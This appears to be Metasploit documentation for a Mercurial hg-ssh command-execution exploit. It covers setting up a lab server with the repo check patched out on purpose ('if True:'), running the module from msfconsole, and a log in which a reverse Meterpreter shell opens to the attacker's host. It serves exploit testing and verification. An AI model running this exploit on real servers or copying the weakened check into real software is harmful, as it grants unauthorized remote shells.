## Vulnerable Application

[mercurial](https://www.mercurial-scm.org/downloads).

This module was successfully tested against:

- Kali Linux, HG 4.0 and a customized hg-ssh (to simulate custom hg-ssh wrappers which have weak repo validation)

## Vulnerable Server Setup Steps

  1. Install mercurial on your test server
  2. Patch the hg-ssh Python script script to emulate custom/weak repo validation in hg-ssh wrapper `vi $(which hg-ssh)`
     - Replace `if repo in allowed paths:` with `if True:`
     - Replace `cmd = ['-R', repo, 'serve', 'stdio']` with `cmd = ['-R', path, 'serve', 'stdio']`
  3. Setup a user with SSH pubkey auth
  4. Create a test repo in the users home directory and add a commit
     - `mkdir -p repos/repo1`
     - `cd repos/repo1`
     - `echo "hello world" > README`
     - `hg add README`
     - `hg commit -m "Adds README"`
  5. Restrict user in authorized_keys to hg-ssh binary only
     - `command="hg-ssh ~/repos/repo1",no-port-forwarding,no-X11-forwarding,no-agent-forwarding INSERT_SSH_PUB_KEY`
  6. Verify SSH user can authenticate (should prompt and prevent a shell)
     - `ssh user@192.168.10.99`
  7. Verify SSH user commands are not allows (should prevent arbitrary commands)
     - `ssh user@192.168.10.99 ifconfig`

## Verification Steps

  1. Start msfconsole
  2. Do: `use exploit/linux/ssh/mercurial_ssh_exec`
  3. Do: `set RHOST <ip>`
  4. Do: `set LHOST <ip>`
  5. Do: `set SSH_PRIV_KEY_FILE /Users/jsmith/.ssh/id_rsa`
  6. Do: `exploit`
  7. You should get a shell.

## Scenarios

### Kali Linux, HG 4.0 and a customized hg-ssh (to simulate custom hg-ssh wrappers which have weak repo validation)

```
msf exploit(mercurial_ssh_exec) > exploit

[*] Started reverse TCP handler on 192.168.10.37:4444 
[*] 192.168.10.99:22 - 192.168.10.99:22 - Attempting to login...
[+] 192.168.10.99:22 - SSH connection is established.
[+] 192.168.10.99:22 - Triggered Debugger (entering debugger - type c to continue starting hg or h for help)
[*] Sending stage (39842 bytes) to 192.168.10.99
[*] Meterpreter session 1 opened (192.168.10.37:4444 -> 192.168.10.99:57606) at 2017-04-18 19:16:44 -0400
```

